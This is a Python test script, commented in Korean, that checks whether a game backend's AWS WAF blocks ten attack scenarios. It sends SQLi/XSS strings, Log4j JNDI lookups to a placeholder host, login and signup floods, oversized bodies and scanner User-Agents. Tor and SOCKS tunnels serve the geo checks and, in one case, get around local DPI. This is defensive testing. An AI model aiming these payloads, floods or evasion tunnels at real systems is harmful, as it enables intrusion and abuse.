# ==========================================
# 🛡️ Vamserlike WAF 보안 테스트 툴 (v3)
# ==========================================
# "WAF 보안 테스트 시나리오 명세서 (v11)"의
# '방어 검증용 테스트' 10개 케이스를 자동 실행합니다.
#
# v2 → v3 변경점:
#   - 속도 제한 케이스(2/3/6/7)를 "버스트 후 폴링" 방식으로 변경.
#     AWS rate-based 규칙은 한도 초과 후 약 30초 주기로 평가되어 차단이
#     지연되므로, 버스트로 한도를 넘긴 뒤 차단(403)이 나타날 때까지 폴링한다.
#
# 핵심 전제:
#   - 요청은 반드시 WAF가 붙은 ALB로 보낼 것. WAF_TARGET_URL=http://<alb-dns>
#   - WAF 규칙이 'Block' 모드로 배포되어 있어야 차단(403)이 발생.
#   - WAF 차단 응답은 HTTP 403 으로 간주.
#   - 속도 규칙은 IP당 5분 100회 기준이므로, 직전 실행으로 IP가 이미 차단된
#     상태면 결과가 왜곡된다. 신뢰성 있는 검증은 차단이 풀린(약 5분 경과) 뒤 1회 실행.
#
# Case 9 (익명 IP)  : 로컬 Tor 사용 → TOR_SOCKS=socks5h://127.0.0.1:9150
# Case 1 (지역 차단): 인도 리전 마이크로 VM SOCKS 터널 → PROXY_IN=socks5h://127.0.0.1:1080
#
# 사전 준비:
#   - pip install "requests[socks]"   (Tor / SSH SOCKS 터널용)
#   - 본체는 허용국인 '한국'에서 실행 (전체를 해외 VM에서 돌리면 Geo가 전부 막아 오탐).
#
# 차단 규칙 식별:
#   직접 정의한 규칙(Geo/크기/UA/속도/Log4j)은 차단 시 'x-waf-rule' 헤더로 규칙명을 보낸다.
#   관리형 룰셋(Common/SQLi/KnownBadInputs/AnonymousIpList)은 헤더가 없어 '(관리형 룰셋)'으로 표시.
# ==========================================

import os
import sys
import time
import random
import string
from pathlib import Path
from dataclasses import dataclass, field
from concurrent.futures import ThreadPoolExecutor, as_completed

_ROOT = str(Path(__file__).resolve().parent.parent)
if _ROOT not in sys.path:
    sys.path.insert(0, _ROOT)

import requests

try:
    from config import BASE_URL, TEST_PW, UNLOCK_TARGET_CHARACTER_ID
except ImportError:
    BASE_URL = os.environ.get("BASE_URL", "http://localhost:5159")
    TEST_PW = os.environ.get("TEST_PW", "Password123!")
    UNLOCK_TARGET_CHARACTER_ID = os.environ.get("UNLOCK_TARGET_CHARACTER_ID", "potato_farmer")

# ------------------------------------------
# 설정
# ------------------------------------------
WAF_TARGET_URL = os.environ.get("WAF_TARGET_URL", BASE_URL).rstrip("/")

PROXIES_GEO = {
    "인도": os.environ.get("PROXY_IN"),
    "남아프리카": os.environ.get("PROXY_ZA"),
    "싱가포르": os.environ.get("PROXY_SG"),
}
TOR_SOCKS = os.environ.get("TOR_SOCKS")

REQ_TIMEOUT = 10

WAF_BLOCK_CODE = 403
BLOCK_HEADER = "x-waf-rule"

# 속도 규칙 폴링 파라미터 (WAF 평가 지연 대응)
RATE_BURST = int(os.environ.get("RATE_BURST", "150"))      # 한도(100) 초과 유도
RATE_POLL_SECONDS = int(os.environ.get("RATE_POLL_SECONDS", "120"))
RATE_PROBE_INTERVAL = 5


def _rule_label(rule):
    return rule if rule else "(관리형 룰셋)"


@dataclass
class WafReport:
    results: list = field(default_factory=list)

    def record(self, name, status, detail=""):
        icon = {"PASS": "🟢", "FAIL": "🔴", "SKIP": "🟡"}.get(status, "⚪")
        print(f"  {icon} {status:<4} │ {name}")
        if detail:
            print(f"            │ → {detail}")
        self.results.append((name, status))

    def summary(self):
        total = len(self.results)
        passed = sum(1 for _, s in self.results if s == "PASS")
        failed = sum(1 for _, s in self.results if s == "FAIL")
        skipped = sum(1 for _, s in self.results if s == "SKIP")
        print("\n" + "=" * 60)
        print("📋 WAF 보안 테스트 결과 요약")
        print("=" * 60)
        for name, s in self.results:
            mark = {"PASS": "✅", "FAIL": "❌", "SKIP": "⏭️"}.get(s, "•")
            print(f"  {mark} {name}")
        print("-" * 60)
        print(f"  합계 {total} │ 차단 확인(PASS) {passed} │ 미차단(FAIL) {failed} │ 건너뜀(SKIP) {skipped}")
        print("=" * 60)
        return failed == 0


# ==========================================
# 공통 헬퍼
# ==========================================
def _rand_email(prefix="waf"):
    suffix = "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
    return f"{prefix}_{suffix}@test.com"


def get_token():
    try:
        res = requests.post(
            f"{WAF_TARGET_URL}/api/dev/bypass-login",
            json={"email": _rand_email("waf_setup"), "password": TEST_PW, "nickname": "waf_tester"},
            timeout=REQ_TIMEOUT,
        )
        if res.status_code != 200:
            return None
        body = res.json()
        data = body.get("data", body) if isinstance(body, dict) else {}
        auth = data.get("auth", {}) if isinstance(data, dict) else {}
        return auth.get("idToken")
    except Exception:
        return None


def send_until_blocked(method, path, max_count, *, headers=None, json_body=None,
                       data=None, params=None, proxies=None):
    sent = 0
    for _ in range(max_count):
        sent += 1
        try:
            resp = requests.request(
                method, f"{WAF_TARGET_URL}{path}",
                headers=headers, json=json_body, data=data, params=params,
                proxies=proxies, timeout=REQ_TIMEOUT,
            )
        except Exception:
            continue
        if resp.status_code == WAF_BLOCK_CODE:
            return True, sent, resp.headers.get(BLOCK_HEADER)
    return False, sent, None


def send_parallel_any_blocked(method, path, count, *, headers=None, json_body=None,
                              data=None, workers=20):
    def _one(_):
        try:
            resp = requests.request(
                method, f"{WAF_TARGET_URL}{path}",
                headers=headers, json=json_body, data=data, timeout=REQ_TIMEOUT,
            )
            return resp.status_code, resp.headers.get(BLOCK_HEADER)
        except Exception:
            return None, None

    blocked = False
    rule = None
    with ThreadPoolExecutor(max_workers=workers) as ex:
        futures = [ex.submit(_one, i) for i in range(count)]
        for f in as_completed(futures):
            code, r = f.result()
            if code == WAF_BLOCK_CODE:
                blocked = True
                rule = r or rule
    return blocked, rule


def rate_test(method, path, *, headers=None, json_body=None):
    """버스트로 한도를 초과시킨 뒤, WAF 평가 지연(약 30초+)을 고려해
    차단(403)이 나타날 때까지 폴링한다. 반환: (blocked, rule, info)"""
    # 1) 버스트 전송 (한도 초과 유도)
    responded = 0
    for _ in range(RATE_BURST):
        try:
            resp = requests.request(method, f"{WAF_TARGET_URL}{path}",
                                    headers=headers, json=json_body, timeout=REQ_TIMEOUT)
            responded += 1
            if resp.status_code == WAF_BLOCK_CODE:
                return True, resp.headers.get(BLOCK_HEADER), f"버스트 {RATE_BURST}건 중 차단"
        except Exception:
            pass
    if responded == 0:
        return False, None, "대상에 연결 불가 — 폴링 생략"
    # 2) 지연 차단 폴링
    print(f"            │ … 버스트 {RATE_BURST}건 완료, 최대 {RATE_POLL_SECONDS}초 폴링 중")
    deadline = time.time() + RATE_POLL_SECONDS
    while time.time() < deadline:
        time.sleep(RATE_PROBE_INTERVAL)
        try:
            resp = requests.request(method, f"{WAF_TARGET_URL}{path}",
                                    headers=headers, json=json_body, timeout=REQ_TIMEOUT)
            if resp.status_code == WAF_BLOCK_CODE:
                waited = int(RATE_POLL_SECONDS - (deadline - time.time()))
                return True, resp.headers.get(BLOCK_HEADER), f"버스트 후 약 {waited}초 뒤 차단"
        except Exception:
            pass
    return False, None, f"{RATE_POLL_SECONDS}초 내 미차단"


# ==========================================
# Case 1. 지역 기반 비정상 접근
# ==========================================
def case_01_geo(report):
    print("\n[Case 1] 지역 기반 비정상 접근 (서비스 대상국 외 차단)")
    try:
        resp = requests.get(f"{WAF_TARGET_URL}/api/health", timeout=REQ_TIMEOUT)
        allowed_ok = resp.status_code != WAF_BLOCK_CODE
        report.record("Case 1-0. 허용국(본인 IP) 통과 확인", "PASS" if allowed_ok else "FAIL",
                      f"본인 IP → /api/health {resp.status_code} (403이 아니어야 정상)")
    except Exception as e:
        report.record("Case 1-0. 허용국(본인 IP) 통과 확인", "SKIP", f"요청 실패: {e}")

    configured = {k: v for k, v in PROXIES_GEO.items() if v}
    if not configured:
        report.record("Case 1. 서비스 대상국 외 차단", "SKIP",
                      "PROXY_IN(인도 VM SSH SOCKS 터널) 미설정 — 비허용국 출처 필요")
        return

    all_blocked = True
    last_rule = None
    for country, proxy in configured.items():
        proxies = {"http": proxy, "https": proxy}
        blocked, sent, rule = send_until_blocked("GET", "/api/health", 50, proxies=proxies)
        tag = f" / 차단규칙: {_rule_label(rule)}" if blocked else ""
        print(f"      - {country} ({proxy}): {'차단' if blocked else '통과(미차단)'} (전송 {sent}건){tag}")
        all_blocked = all_blocked and blocked
        last_rule = rule or last_rule

    report.record("Case 1. 서비스 대상국 외 차단", "PASS" if all_blocked else "FAIL",
                  f"차단규칙: {_rule_label(last_rule)}" if all_blocked else "")


# ==========================================
# Case 2. 랭킹/해금 반복 호출 (Rate-based)
# ==========================================
def case_02_rate(report, token):
    print("\n[Case 2] 랭킹/해금 API 반복 호출 (속도 제한)")
    headers = {"Authorization": f"Bearer {token}"} if token else None

    blocked, rule, info = rate_test("GET", "/api/players/ranking?take=20", headers=headers)
    report.record("Case 2-1. 랭킹 조회 속도 제한", "PASS" if blocked else "FAIL",
                  f"{info} (규칙: {_rule_label(rule)})" if blocked else info)

    blocked, rule, info = rate_test("PUT", "/api/players/me/characters/unlock",
                                    headers=headers, json_body={"characterId": UNLOCK_TARGET_CHARACTER_ID})
    report.record("Case 2-2. 캐릭터 해금 속도 제한", "PASS" if blocked else "FAIL",
                  f"{info} (규칙: {_rule_label(rule)})" if blocked else info)


# ==========================================
# Case 3. 결과 저장 반복 전송 (Rate-based)
# ==========================================
def case_03_rate_progress(report, token):
    print("\n[Case 3] 게임 결과 저장 반복 전송 (속도 제한)")
    headers = {"Authorization": f"Bearer {token}"} if token else None
    payload = {"score": 1500, "level": 10, "playedCharacterId": "rice_farmer"}
    blocked, rule, info = rate_test("PUT", "/api/players/me/progress", headers=headers, json_body=payload)
    report.record("Case 3. 결과 저장 속도 제한", "PASS" if blocked else "FAIL",
                  f"{info} (규칙: {_rule_label(rule)})" if blocked else info)


# ==========================================
# Case 4. 악성 패턴 주입 (CommonRuleSet=XSS, SQLiRuleSet=SQLi)
# ==========================================
def case_04_injection(report):
    print("\n[Case 4] 악성 패턴 주입 (SQLi/XSS)")
    payloads = [
        "' OR 1=1 --",
        "; DROP TABLE Users --",
        "<script>document.cookie</script>",
        "<img onerror=alert(1)>",
    ]
    nosql_payloads = ['{"$gt": ""}', '{"$ne": null}']

    blocked_all = True
    for p in payloads:
        b1, _, r1 = send_until_blocked("POST", "/api/Auth/login", 1,
                                       json_body={"email": p, "password": p})
        b2, _, r2 = send_until_blocked("GET", "/api/players/ranking", 1, params={"take": p})
        hit = b1 or b2
        rule = r1 or r2
        tag = f" ({_rule_label(rule)})" if hit else ""
        print(f"      - {p[:30]!r}: {'차단' if hit else '통과'}{tag}")
        blocked_all = blocked_all and hit
    report.record("Case 4-1. SQLi/XSS 패턴 차단", "PASS" if blocked_all else "FAIL")

    nosql_blocked = 0
    for p in nosql_payloads:
        b, _, _ = send_until_blocked("GET", "/api/players/ranking", 1, params={"take": p})
        if b:
            nosql_blocked += 1
    report.record("Case 4-2. NoSQL 패턴 차단 범위(실측)", "PASS",
                  f"{nosql_blocked}/{len(nosql_payloads)}건 차단 (실측 완료)")


# ==========================================
# Case 5. 대용량 페이로드 (Size Constraint)
# ==========================================
def case_05_size(report):
    print("\n[Case 5] 대용량 페이로드 (요청 크기 제한)")
    BURST = int(os.environ.get("SIZE_TEST_BURST", "5"))
    big_body = "A" * (10 * 1024 * 1024)
    blocked, rule = send_parallel_any_blocked(
        "POST", "/api/players/me/progress", BURST, data=big_body, workers=BURST)
    report.record("Case 5. 8KB 초과 요청 차단", "PASS" if blocked else "FAIL",
                  f"10MB × {BURST}건 전송, 차단규칙: {_rule_label(rule)}" if blocked else f"10MB × {BURST}건 전송")


# ==========================================
# Case 6. 로그인 무차별 대입 (Rate-based)
# ==========================================
def case_06_login_bruteforce(report):
    print("\n[Case 6] 로그인 무차별 대입 (속도 제한)")
    blocked, rule, info = rate_test("POST", "/api/Auth/login",
                                    json_body={"email": "brute@test.com", "password": "wrongpw"})
    report.record("Case 6. 로그인 속도 제한", "PASS" if blocked else "FAIL",
                  f"{info} (규칙: {_rule_label(rule)})" if blocked else info)


# ==========================================
# Case 7. 계정 대량 생성 (Rate-based)
# ==========================================
def case_07_signup_flood(report):
    print("\n[Case 7] 계정 대량 생성 (속도 제한)")
    blocked, rule, info = rate_test("POST", "/api/Auth/signup",
                                    json_body={"email": "flood@test.com", "password": TEST_PW, "nickname": "bot"})
    report.record("Case 7. 회원가입 속도 제한", "PASS" if blocked else "FAIL",
                  f"{info} (규칙: {_rule_label(rule)})" if blocked else info)


# ==========================================
# Case 8. 자동화 도구/스캐너 차단 (String Match)
# ==========================================
def case_08_user_agent(report):
    print("\n[Case 8] 자동화 도구/스캐너 차단 (User-Agent)")
    user_agents = ["sqlmap/1.0", "Nikto/2.5", "zgrab/0.1", "Selenium/4.0", "Puppeteer/20.0"]
    all_blocked = True
    last_rule = None
    for ua in user_agents:
        blocked, _, rule = send_until_blocked(
            "GET", "/api/players/ranking", 1, headers={"User-Agent": ua}, params={"take": 20})
        tag = f" ({_rule_label(rule)})" if blocked else ""
        print(f"      - {ua}: {'차단' if blocked else '통과'}{tag}")
        all_blocked = all_blocked and blocked
        last_rule = rule or last_rule
    report.record("Case 8. 도구 User-Agent 차단", "PASS" if all_blocked else "FAIL",
                  f"차단규칙: {_rule_label(last_rule)}" if all_blocked else "")


# ==========================================
# Case 9. 익명 IP / Tor 차단 (AnonymousIpList)
# ==========================================
def case_09_anonymous_ip(report):
    print("\n[Case 9] 익명 IP / Tor 차단")
    if not TOR_SOCKS:
        report.record("Case 9. Tor/익명 IP 차단", "SKIP",
                      "TOR_SOCKS 미설정 — 로컬 Tor SOCKS5 프록시 필요")
        return
    proxies = {"http": TOR_SOCKS, "https": TOR_SOCKS}
    blocked, sent, rule = send_until_blocked(
        "GET", "/api/players/ranking", 50, params={"take": 20}, proxies=proxies)

    if not blocked:
        report.record("Case 9. Tor/익명 IP 차단", "FAIL", f"Tor 경유 {sent}건 미차단")
        return
    if rule == "case1-geo-allowlist":
        report.record("Case 9. Tor/익명 IP 차단", "PASS",
                      "Geo가 먼저 차단함 — AnonymousIpList 분리 검증은 미국 출구 노드(ExitNodes {us}) 사용 권장")
    else:
        report.record("Case 9. Tor/익명 IP 차단", "PASS",
                      f"AnonymousIpList 차단 (관리형, 전송 {sent}건)")


# ==========================================
# Case 10. 알려진 취약점 공격 패턴 차단 (Log4j + KnownBadInputs)
# ==========================================
def case_10_known_bad_inputs(report):
    print("\n[Case 10] 알려진 취약점 공격 패턴 차단")
    log4j = ["${jndi:ldap://malicious-test.com/a}", "${jndi:rmi://malicious-test.com/b}"]
    all_blocked = True

    # 안랩 로컬 차단(DPI) 우회를 위해 SOCKS5 프록시(인도 터널 또는 Tor)가 설정되어 있다면 암호화 터널로 우회 전송합니다.
    proxy_url = PROXIES_GEO.get("인도") or TOR_SOCKS
    proxies = {"http": proxy_url, "https": proxy_url} if proxy_url else None

    for p in log4j:
        b1, _, r1 = send_until_blocked("POST", "/api/Auth/login", 1,
                                       headers={"X-Test-Payload": p},
                                       json_body={"email": "a@test.com", "password": p},
                                       proxies=proxies) # proxies 옵션 추가
        tag = f" ({_rule_label(r1)})" if b1 else ""
        print(f"      - {p[:40]!r}: {'차단' if b1 else '통과'}{tag}")
        all_blocked = all_blocked and b1

    b_path, _, _ = send_until_blocked("GET", "/web-inf/web.xml", 1, proxies=proxies) # proxies 옵션 추가
    print(f"      - /web-inf/web.xml: {'차단' if b_path else '통과'}")
    all_blocked = all_blocked and b_path

    report.record("Case 10. 알려진 악성 입력 차단", "PASS" if all_blocked else "FAIL")


# ==========================================
# 사전 연결 확인
# ==========================================
def preflight_check():
    """대상(WAF_TARGET_URL)에 연결 가능한지 먼저 확인. 연결 자체가 안 되면 중단."""
    try:
        requests.get(f"{WAF_TARGET_URL}/api/health", timeout=REQ_TIMEOUT)
        return True
    except requests.exceptions.RequestException as e:
        print("\n❌ 대상에 연결할 수 없습니다:", WAF_TARGET_URL)
        print("   이 세션에 WAF_TARGET_URL 환경변수가 설정됐는지 확인하세요.")
        print("   ($env:... 환경변수는 설정한 PowerShell 세션에서만 유효합니다)")
        print("   PowerShell 예:")
        print('     $env:WAF_TARGET_URL="http://<your-alb-dns>"')
        print(f"   상세: {type(e).__name__}")
        return False


# ==========================================
# 메인
# ==========================================
def run_all():
    print("=" * 60)
    print(f"🎯 WAF 테스트 대상: {WAF_TARGET_URL}")
    if WAF_TARGET_URL == BASE_URL:
        print("⚠️  WAF_TARGET_URL이 BASE_URL과 동일합니다. ALB(WAF) 주소인지 확인하세요.")
    print("ℹ️  본체는 한국(허용국)에서 실행하세요. 속도 규칙은 IP당 5분 100회 기준이라,")
    print("    직전 실행으로 IP가 차단된 상태면 결과가 왜곡됩니다. 약 5분 경과 후 1회 실행을 권장합니다.")
    print("    (속도 케이스는 WAF 평가 지연 때문에 케이스당 수십 초~2분이 걸릴 수 있습니다.)")
    print("=" * 60)

    if not preflight_check():
        return False

    report = WafReport()
    token = get_token()
    if not token:
        print("ℹ️  인증 토큰 미확보 — 토큰이 필요한 케이스(2/3)는 401을 거쳐도 속도 규칙 검증은 유효합니다.")

    case_01_geo(report)
    case_02_rate(report, token)
    case_03_rate_progress(report, token)
    case_04_injection(report)
    case_05_size(report)
    case_06_login_bruteforce(report)
    case_07_signup_flood(report)
    case_08_user_agent(report)
    case_09_anonymous_ip(report)
    case_10_known_bad_inputs(report)

    return report.summary()


if __name__ == "__main__":
    try:
        ok = run_all()
        if "--ci" in sys.argv:
            sys.exit(0 if ok else 1)
    except requests.exceptions.ConnectionError:
        print(f"\n❌ 연결 실패: {WAF_TARGET_URL} 에 접속할 수 없습니다.")
        sys.exit(2)
